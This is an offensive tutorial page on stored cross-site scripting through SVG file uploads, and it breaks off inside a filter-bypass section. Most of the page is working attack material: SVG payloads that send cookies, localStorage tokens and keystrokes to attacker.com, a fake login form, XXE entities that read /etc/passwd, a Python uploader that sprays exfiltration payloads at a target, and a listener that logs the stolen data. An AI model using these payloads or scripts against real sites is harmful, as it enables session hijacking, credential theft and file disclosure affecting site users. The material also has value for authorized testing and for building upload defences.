---
title: SVG XSS Upload
description: Exploit file upload functionality by injecting JavaScript payloads inside SVG files to achieve Cross-Site Scripting through image upload vectors.
navigation:
  title: SVG XSS Upload
  icon: i-lucide-code-xss
---

## Understanding SVG XSS Upload

::badge
Stored XSS via File Upload
::

SVG (Scalable Vector Graphics) is an XML-based image format that browsers render natively. Unlike raster image formats, SVG supports embedded JavaScript through event handlers, `<script>` tags, `<foreignObject>` elements, and numerous XML-based injection points. When an application allows SVG uploads and serves them with an executable content type, any embedded JavaScript executes in the context of the hosting domain.

::note
SVG files are XML documents. Any XML parsing context that supports the SVG namespace will process embedded scripts. Browsers treat SVG as active content when served with `image/svg+xml` or rendered inline via `<embed>`, `<iframe>`, `<object>`, or direct URL navigation.
::

::tabs
  :::tabs-item{label="Why SVG Is Dangerous"}
  | Property | Impact |
  | --- | --- |
  | XML-based format | Supports embedded scripting elements |
  | Native browser rendering | No plugin required for execution |
  | Valid image format | Passes most image upload validators |
  | MIME type `image/svg+xml` | Browsers execute JavaScript inside it |
  | Supports event handlers | `onload`, `onclick`, `onerror`, `onmouseover` |
  | Supports `<script>` tags | Direct JavaScript embedding |
  | Supports `<foreignObject>` | Embed full HTML inside SVG |
  | Supports XLink/href attributes | External resource loading and redirection |
  | Passes magic byte checks | XML declaration `<?xml` is the header |
  | Passes extension whitelists | `.svg` is often in allowed image extensions |
  :::

  :::tabs-item{label="Attack Surface"}
  - Profile picture / avatar uploads
  - Document attachment systems
  - CMS media libraries
  - Image galleries and portfolios
  - File sharing platforms
  - Email attachment preview
  - Markdown renderers with image embedding
  - Chat applications with image preview
  - Ticket systems with file attachments
  - E-commerce product image uploads
  - Social media image posting
  - Wiki/knowledge base image embedding
  :::

  :::tabs-item{label="Execution Contexts"}
  | Context | Executes JS? | Notes |
  | --- | --- | --- |
  | Direct URL navigation (`/uploads/evil.svg`) | Yes | Full script execution |
  | `<iframe src="evil.svg">` | Yes | Sandboxed unless `allow-scripts` |
  | `<embed src="evil.svg">` | Yes | Full execution |
  | `<object data="evil.svg">` | Yes | Full execution |
  | `<img src="evil.svg">` | No | Browser sanitizes scripts in `<img>` |
  | CSS `background-image: url(evil.svg)` | No | No script execution |
  | `<svg>` inline in HTML | Yes | Runs in page context directly |
  | Content-Disposition: attachment | No | Forces download, no rendering |
  | Content-Type: text/plain | No | Not parsed as SVG |
  | Content-Type: image/svg+xml | Yes | Full SVG rendering and execution |
  :::
::

---

## Reconnaissance

::accordion
  :::accordion-item{label="Identify Upload Endpoints"}
  ```bash
  # Spider target for upload forms
  gospider -s https://target.com -d 3 -c 10 | grep -iE "upload|file|attach|image|avatar|media|import"
  ```

  ```bash
  # Brute force upload paths
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 | grep -iE "upload|file|media|image|avatar|attach"
  ```

  ```bash
  dirsearch -u https://target.com -w /usr/share/wordlists/dirb/common.txt -e svg,png,jpg -f
  ```

  ```bash
  # Extract upload-related JavaScript endpoints
  curl -s https://target.com | grep -oP '["'"'"'][^"'"'"']*upload[^"'"'"']*["'"'"']' | sort -u
  ```

  ```bash
  # Find API endpoints for file upload
  curl -s https://target.com/api/ 2>/dev/null | grep -iE "upload|file|image|attach|media"
  ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt -mc 200,405
  ```
  :::

  :::accordion-item{label="Test SVG Acceptance"}
  ```bash
  # Create minimal valid SVG
  echo '<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="red"/></svg>' > test.svg

  # Upload clean SVG to check acceptance
  curl -X POST https://target.com/upload \
    -F "file=@test.svg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Test with explicit Content-Type
  curl -X POST https://target.com/upload \
    -F "file=@test.svg;type=image/svg+xml" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Test SVG disguised as other image types
  curl -X POST https://target.com/upload \
    -F "file=@test.svg;type=image/png;filename=test.png" \
    -v

  curl -X POST https://target.com/upload \
    -F "file=@test.svg;type=image/jpeg;filename=test.jpg" \
    -v
  ```
  :::

  :::accordion-item{label="Determine How Uploaded Files Are Served"}
  ```bash
  # Upload a clean SVG and check response headers
  curl -sI https://target.com/uploads/test.svg | grep -iE "content-type|content-disposition|x-content-type|csp"
  ```

  ```bash
  # Check if served inline or as attachment
  curl -sI https://target.com/uploads/test.svg | grep -i "content-disposition"
  # If "attachment" -> download forced, XSS unlikely via direct navigation
  # If "inline" or absent -> renders in browser, XSS possible
  ```

  ```bash
  # Check Content-Security-Policy
  curl -sI https://target.com/uploads/test.svg | grep -i "content-security-policy"
  # If script-src restricts inline scripts -> need CSP bypass
  ```

  ```bash
  # Check X-Content-Type-Options
  curl -sI https://target.com/uploads/test.svg | grep -i "x-content-type-options"
  # If "nosniff" -> browser strictly follows Content-Type header
  ```

  ```bash
  # Check if SVG is served from same origin or CDN
  curl -sI https://target.com/uploads/test.svg | grep -iE "^(location|access-control|server)"
  ```
  :::

  :::accordion-item{label="Identify Sanitization Mechanisms"}
  ```bash
  # Upload SVG with a comment containing "script" to test keyword filtering
  echo '<svg xmlns="http://www.w3.org/2000/svg"><!-- script test --><rect width="1" height="1"/></svg>' > detect.svg
  curl -X POST https://target.com/upload -F "file=@detect.svg" -v
  ```

  ```bash
  # Upload SVG with harmless event handler attribute
  echo '<svg xmlns="http://www.w3.org/2000/svg" onload=""><rect width="1" height="1"/></svg>' > detect2.svg
  curl -X POST https://target.com/upload -F "file=@detect2.svg" -v
  ```

  ```bash
  # Download uploaded file and compare with original
  curl -s https://target.com/uploads/detect.svg > downloaded.svg
  diff detect.svg downloaded.svg
  # If content is stripped/modified -> server-side sanitization exists
  ```

  ```bash
  # Check if server re-renders/rasterizes SVG
  file downloaded.svg
  # If output shows PNG/JPEG instead of SVG XML -> SVG is converted, XSS impossible
  ```
  :::
::

---

## Payload Construction

::callout
SVG supports multiple JavaScript injection vectors. Each targets a different parsing path and may bypass different sanitization mechanisms.
::

### Basic XSS Payloads

::code-group
```xml [onload-event.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100" fill="green"/>
</svg>
```

```xml [script-tag.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('XSS');
  </script>
  <rect width="100" height="100" fill="blue"/>
</svg>
```

```xml [script-cdata.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    <![CDATA[
      alert('XSS');
    ]]>
  </script>
</svg>
```

```xml [foreignobject.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <foreignObject width="300" height="200">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>
```

```xml [animate-xss.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert('XSS')" attributeName="x" dur="1s"/>
</svg>
```

```xml [set-xss.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <set onbegin="alert('XSS')" attributeName="x" to="1" dur="1s"/>
</svg>
```
::

### Event Handler Payloads

::code-group
```xml [mouse-events.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <rect width="500" height="500" fill="white"
    onmouseover="alert('XSS-mouseover')"
    onclick="alert('XSS-click')"
    onmousedown="alert('XSS-mousedown')"
    onmouseup="alert('XSS-mouseup')"
    onmousemove="alert('XSS-mousemove')"
    onfocus="alert('XSS-focus')" tabindex="0"/>
</svg>
```

```xml [focus-events.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red" tabindex="0" onfocus="alert('XSS')"/>
  <circle cx="200" cy="50" r="40" fill="blue" tabindex="1" onfocusin="alert('XSS-focusin')"/>
</svg>
```

```xml [animation-events.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert('XSS-begin')" onend="alert('XSS-end')" onrepeat="alert('XSS-repeat')"
    attributeName="x" from="0" to="100" dur="1s" repeatCount="2"/>
  <rect width="50" height="50" fill="green">
    <animate attributeName="width" from="50" to="200" dur="2s"
      onbegin="alert('XSS-rect-animate')"/>
  </rect>
</svg>
```

```xml [error-events.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://invalid.invalid/nonexistent.jpg" onerror="alert('XSS')"/>
  <image href="x" onerror="alert('XSS-href')"/>
</svg>
```

```xml [load-events.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert('XSS-svg-onload')">
  <image xlink:href="https://via.placeholder.com/1" onload="alert('XSS-image-onload')" width="1" height="1"/>
</svg>
```
::

### Advanced Injection Vectors

::tabs
  :::tabs-item{label="ForeignObject HTML Injection"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <h1>Phishing Login</h1>
        <form action="https://attacker.com/steal">
          <input type="text" name="user" placeholder="Username"/>
          <input type="password" name="pass" placeholder="Password"/>
          <button type="submit">Login</button>
        </form>
        <script>
          document.forms[0].addEventListener('submit', function(e) {
            e.preventDefault();
            var data = new FormData(this);
            fetch('https://attacker.com/steal', {method:'POST', body:data});
          });
        </script>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::tabs-item{label="Use Element Redirect"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoJ1hTUycpIj48L3N2Zz4="/>
  </svg>
  ```

  ```bash
  # The base64 decodes to:
  # <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
  echo 'PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoJ1hTUycpIj48L3N2Zz4=' | base64 -d
  ```
  :::

  :::tabs-item{label="XLink href JavaScript"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="javascript:alert('XSS')">
      <rect width="300" height="100" fill="blue"/>
      <text x="20" y="60" fill="white" font-size="20">Click Me</text>
    </a>
  </svg>
  ```

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="javascript:eval(atob('YWxlcnQoJ1hTUycp'))">
      <circle cx="50" cy="50" r="40" fill="red"/>
    </a>
  </svg>
  ```
  :::

  :::tabs-item{label="Embedded iframe via ForeignObject"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="javascript:alert('XSS')" width="0" height="0"></iframe>
      </body>
    </foreignObject>
  </svg>
  ```

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="https://attacker.com/hook.js" style="display:none"></iframe>
        <img src=x onerror="alert('XSS')"/>
      </body>
    </foreignObject>
  </svg>
  ```
  :::

  :::tabs-item{label="XML Entity Injection"}
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  ```

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  ```

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&exfil;</text>
  </svg>
  ```
  :::
::

---

## Cookie Stealing Payloads

::caution
These payloads exfiltrate session cookies and sensitive data to attacker-controlled servers. Ensure you have authorization before use.
::

::code-group
```xml [cookie-steal-fetch.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)">
  <rect width="100" height="100" fill="white"/>
</svg>
```

```xml [cookie-steal-img.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='https://attacker.com/steal?c='+document.cookie">
  <rect width="100" height="100" fill="white"/>
</svg>
```

```xml [cookie-steal-xhr.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    <![CDATA[
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true);
      xhr.send();
    ]]>
  </script>
</svg>
```

```xml [full-page-exfil.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    <![CDATA[
      var data = {
        cookie: document.cookie,
        url: window.location.href,
        referrer: document.referrer,
        origin: window.location.origin,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
      };
      fetch('https://attacker.com/exfil', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      });
    ]]>
  </script>
</svg>
```

```xml [keylogger.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="0" height="0">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>
        var keys = '';
        document.addEventListener('keypress', function(e) {
          keys += e.key;
          if (keys.length > 20) {
            new Image().src = 'https://attacker.com/keys?k=' + encodeURIComponent(keys);
            keys = '';
          }
        });
      </script>
    </body>
  </foreignObject>
</svg>
```

```xml [token-steal-localstorage.svg]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token')+'&amp;jwt='+localStorage.getItem('jwt'))">
  <rect width="1" height="1"/>
</svg>
```
::

---

## Attack Execution

### Method 1 — Direct cURL Upload

::tabs
  :::tabs-item{label="Standard SVG Upload"}
  ```bash
  # Basic onload XSS
  cat > xss.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100"/>
  </svg>
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@xss.svg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Script tag XSS
  cat > xss2.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
  </svg>
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@xss2.svg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # Cookie stealing payload
  cat > steal.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ATTACKER.com/c?d='+document.domain+'&c='+document.cookie)">
    <rect width="1" height="1"/>
  </svg>
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@steal.svg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```
  :::

  :::tabs-item{label="MIME Type Manipulation"}
  ```bash
  # Upload SVG as image/svg+xml
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/svg+xml" \
    -v

  # Upload SVG as generic image
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/png" \
    -v

  # Upload SVG as XML
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=application/xml" \
    -v

  # Upload SVG as text/xml
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=text/xml" \
    -v

  # Upload SVG as octet-stream
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=application/octet-stream" \
    -v

  # Upload SVG as text/html (may trigger HTML rendering)
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=text/html" \
    -v
  ```
  :::

  :::tabs-item{label="Extension Manipulation"}
  ```bash
  # SVG with alternate extensions
  cp xss.svg xss.svgz
  cp xss.svg xss.xml
  cp xss.svg xss.xhtml
  cp xss.svg xss.svg.xml
  cp xss.svg xss.html

  for ext in svg svgz xml xhtml svg.xml html; do
    curl -X POST https://target.com/upload \
      -F "file=@xss.${ext}" \
      -H "Cookie: session=YOUR_SESSION" \
      -s -o /dev/null -w "%{http_code} xss.${ext}\n"
  done
  ```

  ```bash
  # Case variations
  for ext in SVG Svg sVg svG SVg SvG sVG; do
    cp xss.svg "xss.${ext}"
    curl -X POST https://target.com/upload \
      -F "file=@xss.${ext}" \
      -s -o /dev/null -w "%{http_code} xss.${ext}\n"
  done
  ```

  ```bash
  # Double extension variants
  for safe in jpg png gif bmp; do
    cp xss.svg "xss.${safe}.svg"
    cp xss.svg "xss.svg.${safe}"
    curl -X POST https://target.com/upload \
      -F "file=@xss.${safe}.svg" \
      -s -o /dev/null -w "%{http_code} xss.${safe}.svg\n"
    curl -X POST https://target.com/upload \
      -F "file=@xss.svg.${safe}" \
      -s -o /dev/null -w "%{http_code} xss.svg.${safe}\n"
  done
  ```
  :::
::

### Method 2 — Python Automated Upload & Trigger

::code-group
```python [svg_xss_uploader.py]
import requests
import sys
import urllib3
urllib3.disable_warnings()

target = sys.argv[1]
upload_endpoint = sys.argv[2] if len(sys.argv) > 2 else "/upload"
attacker_server = sys.argv[3] if len(sys.argv) > 3 else "https://attacker.com"

upload_url = f"{target.rstrip('/')}{upload_endpoint}"

payloads = {
    "onload": f'<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'{attacker_server}/c?d=\'+document.domain+\'&c=\'+document.cookie)"><rect width="1" height="1"/></svg>',
    
    "script": f'<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("{attacker_server}/c?d="+document.domain+"&c="+document.cookie)</script></svg>',
    
    "script_cdata": f'<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch("{attacker_server}/c?d="+document.domain+"&c="+document.cookie)]]></script></svg>',
    
    "foreignobject": f'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><script>fetch("{attacker_server}/c?d="+document.domain+"&c="+document.cookie)</script></body></foreignObject></svg>',
    
    "animate": f'<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="fetch(\'{attacker_server}/c?d=\'+document.domain+\'&c=\'+document.cookie)" attributeName="x" dur="1s"/></svg>',
    
    "set": f'<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="fetch(\'{attacker_server}/c?d=\'+document.domain+\'&c=\'+document.cookie)" attributeName="x" to="1" dur="1s"/></svg>',
    
    "a_href": f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:fetch(\'{attacker_server}/c?d=\'+document.domain+\'&c=\'+document.cookie)"><rect width="300" height="300" fill="white"/><text x="10" y="50">Click</text></a></svg>',
}

headers = {"Cookie": "session=YOUR_SESSION_COOKIE"}

print(f"[*] Target: {upload_url}")
print(f"[*] Attacker: {attacker_server}")
print(f"[*] Testing {len(payloads)} payload variants\n")

for name, payload in payloads.items():
    filename = f"xss_{name}.svg"
    files = {"file": (filename, payload, "image/svg+xml")}
    try:
        r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=15)
        status = "UPLOADED" if r.status_code in [200, 201] and "error" not in r.text.lower() else "FAILED"
        print(f"[{status}] {filename} -> HTTP {r.status_code} ({len(r.text)} bytes)")
        if status == "UPLOADED":
            # Try to extract file path from response
            import re
            paths = re.findall(r'["\']([^"\']*\.svg[^"\']*)["\']', r.text)
            for p in paths:
                print(f"        -> Possible path: {p}")
    except Exception as e:
        print(f"[ERROR] {filename} -> {e}")
```

```python [svg_xss_scanner.py]
import requests
import sys
import re
import urllib3
urllib3.disable_warnings()

target = sys.argv[1]
upload_url = f"{target.rstrip('/')}/upload"

# Minimal probe payloads
probes = [
    ("probe_onload.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="window.__xss=1"><rect width="1" height="1"/></svg>'),
    ("probe_script.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>window.__xss=1</script></svg>'),
    ("probe_animate.svg", '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="window.__xss=1" attributeName="x" dur="1s"/></svg>'),
    ("probe_foreign.svg", '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="window.__xss=1"/></body></foreignObject></svg>'),
]

headers = {"Cookie": "session=YOUR_SESSION_COOKIE"}

upload_dirs = ["uploads", "upload", "files", "images", "media", "assets", "content", "static", "data", "avatars", "profile"]

for filename, payload in probes:
    print(f"\n[*] Testing: {filename}")
    files = {"file": (filename, payload, "image/svg+xml")}
    try:
        r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
        if r.status_code in [200, 201]:
            print(f"    [+] Upload returned {r.status_code}")
            
            # Extract path from response
            paths_found = re.findall(r'(?:href|src|url|path|file)["\s:=]+([^"\'>\s]+\.svg)', r.text, re.IGNORECASE)
            
            # Also try common directories
            for d in upload_dirs:
                test_url = f"{target.rstrip('/')}/{d}/{filename}"
                try:
                    tr = requests.get(test_url, verify=False, timeout=5)
                    if tr.status_code == 200 and "svg" in tr.headers.get("content-type", ""):
                        ct = tr.headers.get("content-type", "")
                        cd = tr.headers.get("content-disposition", "inline")
                        csp = tr.headers.get("content-security-policy", "none")
                        print(f"    [FOUND] {test_url}")
                        print(f"            Content-Type: {ct}")
                        print(f"            Content-Disposition: {cd}")
                        print(f"            CSP: {csp}")
                        
                        # Check if XSS-relevant content survived
                        if "onload" in tr.text or "<script" in tr.text or "onbegin" in tr.text or "onerror" in tr.text:
                            print(f"            [!!!] XSS payload INTACT in response")
                        else:
                            print(f"            [-] Payload appears sanitized")
                except:
                    pass
        else:
            print(f"    [-] Upload returned {r.status_code}")
    except Exception as e:
        print(f"    [ERROR] {e}")
```

```python [attacker_listener.py]
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import sys
import json
from datetime import datetime

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        source_ip = self.client_address[0]
        
        print(f"\n{'='*60}")
        print(f"[{timestamp}] Callback from {source_ip}")
        print(f"Path: {self.path}")
        for key, values in params.items():
            for val in values:
                print(f"  {key}: {urllib.parse.unquote(val)}")
        print(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"Referer: {self.headers.get('Referer', 'N/A')}")
        print(f"{'='*60}")
        
        # Log to file
        with open("stolen_data.log", "a") as f:
            f.write(json.dumps({
                "time": timestamp,
                "ip": source_ip,
                "path": self.path,
                "params": {k: v for k, v in params.items()},
                "ua": self.headers.get("User-Agent"),
                "referer": self.headers.get("Referer")
            }) + "\n")
        
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")
    
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n{'='*60}")
        print(f"[{timestamp}] POST from {self.client_address[0]}")
        print(f"Body: {body}")
        print(f"{'='*60}")
        
        with open("stolen_data.log", "a") as f:
            f.write(json.dumps({"time": timestamp, "method": "POST", "body": body}) + "\n")
        
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
print(f"[*] Listening on port {port}...")
HTTPServer(("0.0.0.0", port), StealHandler).serve_forever()
```
::

### Method 3 — Burp Suite Manipulation

::steps{level="4"}
#### Capture Upload Request

```
1. Set browser proxy to Burp (127.0.0.1:8080)
2. Navigate to upload functionality
3. Select any image file
4. Click Upload with Intercept ON
```

#### Modify Request to SVG XSS

Original captured request:

```http
POST /api/upload HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----WebKitBound

------WebKitBound
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

<binary JPEG data>
------WebKitBound--
```

Modified request:

```http
POST /api/upload HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----WebKitBound

------WebKitBound
Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://ATTACKER/c?c='+document.cookie)">
<rect width="100" height="100" fill="white"/>
</svg>
------WebKitBound--
```

#### Alternative — Keep JPG Extension with SVG Content

```http
POST /api/upload HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----WebKitBound

------WebKitBound
Content-Disposition: form-data; name="avatar"; filename="avatar.jpg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
<rect width="1" height="1"/>
</svg>
------WebKitBound--
```

#### Verify Upload and Trigger

```bash
# Find uploaded file URL from response
# Navigate to it directly in browser
# Or use curl to check headers
curl -sI https://target.com/uploads/avatar.svg
```
::

### Method 4 — Multipart Raw Request Variants

::code-collapse
```bash [Double Content-Disposition]
curl -X POST https://target.com/upload \
  -H "Content-Type: multipart/form-data; boundary=----Bound" \
  --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"\r\nContent-Disposition: form-data; name="file"; filename="xss.svg"\r\nContent-Type: image/jpeg\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="1" height="1"/></svg>\r\n------Bound--'
```

```bash [Filename in Both Headers]
curl -X POST https://target.com/upload \
  -H "Content-Type: multipart/form-data; boundary=----Bound" \
  --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8\'\'xss.svg\r\nContent-Type: image/svg+xml\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>\r\n------Bound--'
```

```bash [Quoted and Unquoted Filename]
curl -X POST https://target.com/upload \
  -H "Content-Type: multipart/form-data; boundary=----Bound" \
  --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename=xss.svg\r\nContent-Type: image/jpeg\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>\r\n------Bound--'
```

```bash [Null Byte in Filename]
curl -X POST https://target.com/upload \
  -H "Content-Type: multipart/form-data; boundary=----Bound" \
  --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="xss.svg%00.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>\r\n------Bound--'
```

```bash [Line Break in Filename]
curl -X POST https://target.com/upload \
  -H "Content-Type: multipart/form-data; boundary=----Bound" \
  --data-binary $'------Bound\r\nContent-Disposition: form-data; name="file"; filename="xss.sv\r\ng"\r\nContent-Type: image/svg+xml\r\n\r\n<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>\r\n------Bound--'
```
::

---

## Sanitization Bypass Techniques

::card-group
  :::card
  ---
  title: Keyword Filter Bypass
  ---
  When filters strip `script`, `onload`, or `alert`:

  ```xml
  <!-- Case variation -->
  <svg xmlns="http://www.w3.org/2000/svg" ONLOAD="alert(1)"></svg>
  <svg xmlns="http://www.w3.org/2000/svg" OnLoad="alert(1)"></svg>

  <!-- Tab/newline injection in attribute name -->
  <svg xmlns="http://www.w3.org/2000/svg" on&#x09;load="alert(1)"></svg>
  <svg xmlns="http://www.w3.org/2000/svg" on&#x0A;load="alert(1)"></svg>

  <!-- Script tag with whitespace -->
  <svg xmlns="http://www.w3.org/2000/svg"><script >alert(1)</script></svg>
  <svg xmlns="http://www.w3.org/2000/svg"><script	>alert(1)</script></svg>

  <!-- Recursive stripping bypass -->
